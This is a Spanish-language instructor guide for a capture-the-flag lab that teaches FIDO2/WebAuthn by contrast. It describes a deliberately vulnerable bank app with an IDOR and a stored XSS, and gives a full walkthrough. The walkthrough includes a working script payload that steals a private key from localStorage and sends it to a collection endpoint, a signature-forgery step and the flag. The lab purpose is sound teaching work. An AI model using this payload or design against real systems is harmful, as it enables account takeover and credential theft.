# Guía del instructor — CTF "Passwordless de Cartón" (HackerBank)

Documento para el equipo organizador del **Hacking Day de Córdoba**: solución
completa, explicación de cada vulnerabilidad, teoría de FIDO2, rúbrica y montaje.

> 100% educativo y ético. Todos los datos son ficticios.

---

## 1. Objetivo pedagógico

Enseñar, por contraste, cómo protege FIDO2/WebAuthn real. El estudiante roba la
clave privada del CEO con un **Stored XSS** y entra a su cuenta. El aprendizaje
central: **guardar la clave privada donde JavaScript la alcanza (`localStorage`)
la hace robable por un XSS.** En FIDO2 real la clave vive en el TPM/Secure
Enclave y JS nunca la toca — el mismo XSS no roba nada.

## 2. Diseño y vulnerabilidades

Como FIDO2 real, el servidor SOLO guarda claves públicas (tabla `credentials`).
La clave privada de cada passkey vive en `localStorage` del cliente. Endpoints:

| Endpoint | Qué hace |
|---|---|
| `POST /auth/register` | Registra una passkey (solo la pública). Cerrado para el CEO. |
| `POST /auth/challenge` | `{username}` → `{user_id, challenge}`. |
| `GET /auth/keys/<user_id>` | Credencial (credential_id + pública) de cualquiera. **IDOR**. |
| `POST /auth/verify` | `{username, credential_id, challenge, signature}` → sesión. Honesto (valida binding + firma). |
| `POST /messages` / `GET /inbox` | Deja / muestra "mensajes al administrador". `/inbox` no sanitiza → **Stored XSS**. |
| `POST /social/notify` | Dispara al bot CEO a leer su bandeja (1/min). |
| `GET /collect` / `GET /collected` | Buzón donde el payload exfiltra / donde se lee. |

Buscar `VULN` en `app.py`:
- **VULN-1 (IDOR):** `/auth/keys/<id>` sin autorización → filtra el credential_id del CEO.
- **VULN-2 (Stored XSS):** `/inbox` renderiza los mensajes con `| safe`.

El bot CEO (`bot.py`, Playwright headless) tiene la clave privada del CEO en su
`localStorage` pero **no una sesión bancaria**: por eso el XSS solo puede robar
la clave, no leer la flag directo. `/auth/verify` NO tiene bug de lógica.

## 3. Solución paso a paso

Usuarios: `t3ny` (práctica), `ceo` (id `7013`, objetivo), señuelos.

### Capa 1 — Reconocer el flujo (Burp)
Login como `t3ny` en `/login`. En Burp: `POST /auth/register` (registra la
passkey, solo la pública), `POST /auth/challenge` (→ `user_id`), `GET
/auth/keys/<user_id>` (→ tu credential_id), `POST /auth/verify`. La clave privada
nunca viaja (vive en `localStorage`).

### Capa 2 — IDOR: el credential_id del CEO
En el Repeater, variar `GET /auth/keys/<id>` (`7013`, `7025`, `7031`, `7058`).
Identificar `7013 = ceo` y guardar su `credential_id`. Con la clave pública no se
puede firmar: falta la privada.

### Capa 3 — Stored XSS: robar la clave privada del CEO
1. Logueado como `t3ny`, ir a **Mensajes al administrador** (`/mensajes`) y dejar
   un mensaje con el payload:

```html
Hola, necesito ayuda con mi cuenta.
<script>
window.addEventListener("load", function () {
  var user = document.getElementById("nombre_usuario").innerText;
  if (user !== "t3ny") {                                    // es el CEO
    var priv = localStorage.getItem("hb_privkey_" + user); // su clave privada
    new Image().src = "/collect?data=" + encodeURIComponent(priv);
  }
});
</script>
```

2. Usar la **ingeniería social** (botón "Avisar al administrador") → el bot CEO
   visita `/inbox` y ejecuta el payload.
3. Leer la clave privada del CEO en **`/collected`**.

### Capa 4 — Firmar y entrar (consola F12)
Con el credential_id (Capa 2) y la clave (Capa 3). En la consola de una página
que cargue `script.js` (p.ej. `/collected` o `/login`):

```js
hbForge("ceo", "<credential_id del IDOR>", "<clave privada del buzón>")
```

`hbForge` pide un challenge fresco del CEO, lo firma (ECDSA-SHA256, raw r‖s) y
hace `verify` → entra como CEO → **código ganador** + pantalla comparativa.

### Script de resolución
[`solve.py`](solve.py) hace todo con `requests` (el bot del server ejecuta el
XSS): login `t3ny` → deja el payload → dispara la ingeniería social → lee la
clave en `/collected` → credential_id por IDOR → firma y entra. Imprime la flag.

## 4. El código ganador (flag)

```
f27ad11c21afef4f4c54a3930698f616
```

MD5 ficticio, determinístico (`CEO_WINNING_CODE` en `seed.py`). Cambiarlo ahí si
se quiere una flag distinta por evento.

## 5. Teoría: FIDO2/WebAuthn real

- **Registro:** el dispositivo genera el par; al servidor viaja solo la **clave
  pública**. La privada la crea y guarda el autenticador (TPM/Secure Enclave).
- **Autenticación:** el servidor manda un `challenge`; el autenticador lo firma
  con la clave privada (desbloqueada por biometría/PIN) y devuelve la **firma**.
  Nunca la clave privada.
- **TPM / Secure Enclave:** chip que genera y usa la clave **adentro**; el
  software solo recibe la firma. La clave es **inextraíble**: ni el dueño del
  dispositivo, ni un XSS, ni un compromiso del SO la pueden leer.

### Tabla comparativa (la que ve el estudiante al ganar)

| Lo que rompiste (FIDO2 de cartón) | Cómo lo previene FIDO2 real |
|---|---|
| Robaste la clave privada del CEO con un XSS | La clave vive en el TPM: JavaScript nunca puede leerla |
| La clave estaba en localStorage, al alcance de JS | En FIDO2 la clave nunca sale del hardware ni toca el navegador |
| Un mensaje malicioso ejecutó código en el CEO | Aunque haya XSS, del lado del cliente no hay clave privada que robar |
| Filtraste el credential_id con un IDOR | El credential_id no es secreto, pero sin la privada (inrobable) no sirve |
| Firmaste el challenge con la clave robada | Firmar exige la clave en hardware + verificación del usuario (biometría) |

## 6. Rúbrica sugerida

| Criterio | Qué se espera | Puntaje |
|---|---|---|
| Reconocimiento (Capa 1) | Capturas de Burp del flujo; notar que la privada vive en localStorage. | 15% |
| IDOR (Capa 2) | Evidencia de la enumeración de `/auth/keys` y del credential_id del CEO. | 20% |
| Stored XSS (Capa 3) | El payload, cómo detecta a la víctima, la ingeniería social y la exfiltración. | 30% |
| Firma y suplantación (Capa 4) | Firmar el challenge (raw r‖s, P-256) con la clave robada y obtener la flag. | 20% |
| Mitigación | Output encoding / sanitizar + CSP, y por qué la clave debe estar en hardware. | 15% |

Flag correcta (`f27ad11c21afef4f4c54a3930698f616`) como condición necesaria.

## 7. Montaje para el Hacking Day

### Tiempo estimado
- Capa 1: 15-25 min · Capa 2: 15-30 min · Capa 3 (XSS + bot): 25-45 min ·
  Capa 4: 15-25 min. **Total: ~70-125 min.**

### Reset entre participantes
`docker compose restart` (recrea la base, reaprovisiona la passkey del CEO y
reinicia el bot). Nota: las passkeys del navegador quedan en `localStorage`; para
empezar de cero en el mismo navegador, limpiarlo.

### Problemas comunes

| Problema | Causa | Solución |
|---|---|---|
| La clave no llega al buzón | El bot CEO no corrió, o el payload esperaba mal el `load` | Verificar que el contenedor esté up (el bot va adentro); usar el payload de la guía. |
| `403` al loguearse como `ceo` en la web | Registro de passkeys cerrado para el CEO (a propósito) | No es un bug: hay que robar su clave, no registrar una nueva. |
| "Firma inválida" en Python | Se mandó la firma en DER en vez de raw r‖s | Convertir DER → r‖s (64 bytes), como en `solve.py`. |
| El build tarda / pesa | Baja Chromium (imagen de Playwright) | Es esperado la primera vez; después queda cacheado. |

### Recordatorio ético
Estas técnicas (IDOR, análisis de JS, XSS, forja de firmas) se practican acá
sobre un blanco ficticio y con permiso. Aplicarlas contra sistemas reales sin
autorización es ilegal. El valor está en entender la defensa.
